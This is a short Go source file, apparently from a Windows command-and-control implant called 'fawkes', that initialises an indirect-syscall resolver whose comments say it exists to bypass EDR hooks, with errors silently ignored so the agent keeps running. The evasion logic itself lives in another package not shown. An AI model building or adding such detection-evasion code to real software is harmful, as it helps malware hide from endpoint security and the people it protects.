//go:build windows

package main

import "fawkes/pkg/commands"

// initIndirectSyscalls initializes the indirect syscall resolver at startup.
// Resolves Nt* syscall numbers from ntdll's export table and generates stubs
// that jump to ntdll's own syscall;ret gadget for EDR hook bypass.
// Wrapped in recover() to prevent panics from killing the agent.
func initIndirectSyscalls() {
	defer func() {
		if r := recover(); r != nil {
			// Silently continue — agent works without indirect syscalls
		}
	}()
	_ = commands.InitIndirectSyscalls()
}
